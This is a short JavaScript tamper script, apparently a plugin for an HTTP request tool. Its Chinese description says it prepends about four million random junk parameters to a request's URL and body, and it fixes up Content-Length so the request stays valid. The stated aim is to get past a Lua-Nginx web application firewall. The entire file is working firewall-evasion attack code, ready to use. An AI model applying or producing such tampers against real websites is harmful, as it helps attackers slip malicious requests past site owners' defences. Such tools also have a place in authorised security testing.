//@name: Lua-Nginx极限参数
//@usage: request
//@enable: false
//@description: 前置4194304个垃圾参数（Lua-Nginx WAF极限绕过；报文巨大慎用）
function randPairs(n){
    var chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    var parts = [];
    for (var i = 0; i < n; i++){
        parts.push(chars.charAt(Math.floor(Math.random() * chars.length)) + chars.charAt(Math.floor(Math.random() * chars.length)) + '=');
    }
    return parts.join('&');
}
function tamper(request){
    var junk = randPairs(4194304);
    var headEnd = request.indexOf('\r\n\r\n');
    var head = headEnd < 0 ? request : request.substring(0, headEnd);
    var body = headEnd < 0 ? null : request.substring(headEnd + 4);
    var nl = head.indexOf('\r\n');
    var line1 = nl < 0 ? head : head.substring(0, nl);
    var headers = nl < 0 ? '' : head.substring(nl);
    var sp = line1.lastIndexOf(' HTTP/');
    var url = sp < 0 ? line1 : line1.substring(0, sp);
    var ver = sp < 0 ? '' : line1.substring(sp);
    if (url.indexOf('?') >= 0){ url += '&' + junk; } else { url += '?' + junk; }
    var out = url + ver + headers;
    if (body === null){ return out; }
    body = body.length > 0 ? junk + '&' + body : junk;
    var blen = unescape(encodeURIComponent(body)).length;
    if (/^Content-Length:/im.test(out)){
        out = out.replace(/^Content-Length:[^\r\n]*/im, 'Content-Length: ' + blen);
    } else if (body.length > 0){
        out += '\r\nContent-Length: ' + blen;
    }
    return out + '\r\n\r\n' + body;
}